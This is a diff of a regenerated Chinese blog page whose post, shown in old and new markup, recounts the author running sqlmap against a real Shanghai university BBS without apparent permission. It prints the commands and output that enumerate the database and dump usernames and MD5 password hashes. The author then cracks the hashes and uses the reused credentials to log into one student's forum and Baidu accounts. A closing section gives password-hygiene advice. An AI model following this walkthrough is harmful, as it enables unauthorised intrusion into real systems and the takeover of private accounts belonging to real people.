@@ -420,33 +420,25 @@
 
       
         <ul>
-<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。 <a id="more"></a></li>
+<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。<a id="more"></a> 
+</li>
 </ul>
-<h3 id="sqlmap的一般用法">sqlmap的一般用法</h3>
-<p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>
-sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot;</div></pre></td></tr></table></figure></p>
-<p>知道目标URL后可以用:<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; --dbs</div></pre></td></tr></table></figure></p>
-<p>得到了下面的数据库信息: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">available databases [5]:</div><div class="line">[*] bbscore</div><div class="line">[*] bbscore_db</div><div class="line">[*] information_schema</div><div class="line">[*] mysql</div><div class="line">[*] performance_schema</div></pre></td></tr></table></figure></p>
-<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore --tables</div></pre></td></tr></table></figure></p>
-<p>得到了下面的表信息: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Database: bbscore</div><div class="line">[83 tables]</div><div class="line">+-----------------+</div><div class="line">| action          |</div><div class="line">| user            |</div><div class="line">| admin           |</div><div class="line">| admin_memberfee |</div><div class="line">| admin_operlog   |</div><div class="line">| area            |</div><div class="line">| area_class      |</div><div class="line">| area_rule       |</div><div class="line">| art_pool        |</div><div class="line">| ban             |</div><div class="line">| banner          |</div><div class="line">| bbsvars         |</div><div class="line">……</div></pre></td></tr></table></figure></p>
-<p>省略了下面的表信息。 我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user --columns</div></pre></td></tr></table></figure></p>
-<p>得到下面的信息: <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[09:46:22] [INFO] fetching columns for table &apos;user&apos; in database &apos;bbscore&apos;</div><div class="line">[09:46:22] [INFO] resumed: 30</div><div class="line">[09:46:22] [INFO] resumed: id</div><div class="line">[09:46:22] [INFO] resumed: int(10) unsigned</div><div class="line">[09:46:22] [INFO] resumed: username</div><div class="line">[09:46:22] [INFO] resumed: varchar(16)</div><div class="line">[09:46:22] [INFO] resumed: passwd</div><div class="line">[09:46:22] [INFO] resumed: varchar(32)</div><div class="line">[09:46:22] [INFO] resumed: face</div><div class="line">[09:46:22] [INFO] resumed: smallint(6)</div><div class="line">[09:46:22] [INFO] resumed: sex</div><div class="line">[09:46:22] [INFO] resumed: tinyint(4)</div></pre></td></tr></table></figure></p>
-<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-) <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user -C username,passwd --dump</div></pre></td></tr></table></figure></p>
-<p>附上一张图片吧，这酸爽…… <img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b2eq1zrj31740s4qan.jpg" alt="screenshot"> 通过md5在线破解网站获得明文密码:-)</p>
-<h3 id="意外的惊喜">意外的惊喜</h3>
-<p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>
-得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>
-首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:</p>
-<ol style="list-style-type: decimal">
+<h3 id="sqlmap的一般用法"><a href="#sqlmap的一般用法" class="headerlink" title="sqlmap的一般用法"></a>sqlmap的一般用法</h3><p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot;</div></pre></td></tr></table></figure></p>
+<p>知道目标URL后可以用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; --dbs</div></pre></td></tr></table></figure></p>
+<p>得到了下面的数据库信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">available databases [5]:</div><div class="line">[*] bbscore</div><div class="line">[*] bbscore_db</div><div class="line">[*] information_schema</div><div class="line">[*] mysql</div><div class="line">[*] performance_schema</div></pre></td></tr></table></figure></p>
+<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore --tables</div></pre></td></tr></table></figure></p>
+<p>得到了下面的表信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Database: bbscore</div><div class="line">[83 tables]</div><div class="line">+-----------------+</div><div class="line">| action          |</div><div class="line">| user            |</div><div class="line">| admin           |</div><div class="line">| admin_memberfee |</div><div class="line">| admin_operlog   |</div><div class="line">| area            |</div><div class="line">| area_class      |</div><div class="line">| area_rule       |</div><div class="line">| art_pool        |</div><div class="line">| ban             |</div><div class="line">| banner          |</div><div class="line">| bbsvars         |</div><div class="line">……</div></pre></td></tr></table></figure></p>
+<p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user --columns</div></pre></td></tr></table></figure></p>
+<p>得到下面的信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[09:46:22] [INFO] fetching columns for table &apos;user&apos; in database &apos;bbscore&apos;</div><div class="line">[09:46:22] [INFO] resumed: 30</div><div class="line">[09:46:22] [INFO] resumed: id</div><div class="line">[09:46:22] [INFO] resumed: int(10) unsigned</div><div class="line">[09:46:22] [INFO] resumed: username</div><div class="line">[09:46:22] [INFO] resumed: varchar(16)</div><div class="line">[09:46:22] [INFO] resumed: passwd</div><div class="line">[09:46:22] [INFO] resumed: varchar(32)</div><div class="line">[09:46:22] [INFO] resumed: face</div><div class="line">[09:46:22] [INFO] resumed: smallint(6)</div><div class="line">[09:46:22] [INFO] resumed: sex</div><div class="line">[09:46:22] [INFO] resumed: tinyint(4)</div></pre></td></tr></table></figure></p>
+<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user -C username,passwd --dump</div></pre></td></tr></table></figure></p>
+<p>附上一张图片吧，这酸爽……<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b2eq1zrj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
+<h3 id="意外的惊喜"><a href="#意外的惊喜" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
+<ol>
 <li>这个用户名少见，不容易和其他单词混淆</li>
-<li>该用户可能在多处使用了相同用户名</li>
+<li>该用户可能在多处使用了相同用户名  </li>
 </ol>
-<p>下一步就是借助强大的Google查找该用户的踪迹。看截图: <img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b34vfmwj31700rh7eo.jpg"> 尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>
-发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>
-登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ <img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b3qr3pkj31400cwaen.jpg"></p>
-<h3 id="总结">总结</h3>
-<p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。</p>
+<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b34vfmwj31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="https://ws1.sinaimg.cn/large/005WMcFzly1fe1b3qr3pkj31400cwaen.jpg" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
 <ul>
 <li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
 <li>密码太简单，直接导致在线md5破解很容易查出明文。</li>
@@ -458,9 +450,10 @@ sqlmap的使用非常简单，通常我们使用如下命令就可以获知目�
 <li>避免使用固定的用户名和密码，尤其是在一些安全没有保证的小站上</li>
 <li>开启两步验证等方式，（手机验证码）</li>
 </ul>
-<p>最后的最后，很多人问密码太多记不住咋办？<br>
-下面问题来了：如何优雅的管理密码?<br>
-给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。 &gt; A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
+<p>最后的最后，很多人问密码太多记不住咋办？<br>下面问题来了：如何优雅的管理密码?<br>给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。</p>
+<blockquote>
+<p>A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
+</blockquote>
 
       
     </div>
@@ -503,8 +496,8 @@ sqlmap的使用非常简单，通常我们使用如下命令就可以获知目�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/02/27/2016-02-27-pi/" rel="next" title="娱乐向---Raspberry Pi搭建家庭影音娱乐系统">
-                <i class="fa fa-chevron-left"></i> 娱乐向---Raspberry Pi搭建家庭影音娱乐系统
+              <a href="/2016/03/06/2016-03-13-tor/" rel="next" title="使用tor隐藏自己的踪迹和深网">
+                <i class="fa fa-chevron-left"></i> 使用tor隐藏自己的踪迹和深网
               </a>
             
           </div>
@@ -513,8 +506,8 @@ sqlmap的使用非常简单，通常我们使用如下命令就可以获知目�
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/03/06/2016-03-13-tor/" rel="prev" title="使用tor隐藏自己的踪迹和深网">
-                使用tor隐藏自己的踪迹和深网 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/04/12/2016-04-12-clock/" rel="prev" title="基于89C51的电子时钟设计">
+                基于89C51的电子时钟设计 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -594,7 +587,7 @@ sqlmap的使用非常简单，通常我们使用如下命令就可以获知目�
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-count">31</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -605,7 +598,7 @@ sqlmap的使用非常简单，通常我们使用如下命令就可以获知目�
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-count">11</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -616,7 +609,7 @@ sqlmap的使用非常简单，通常我们使用如下命令就可以获知目�
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
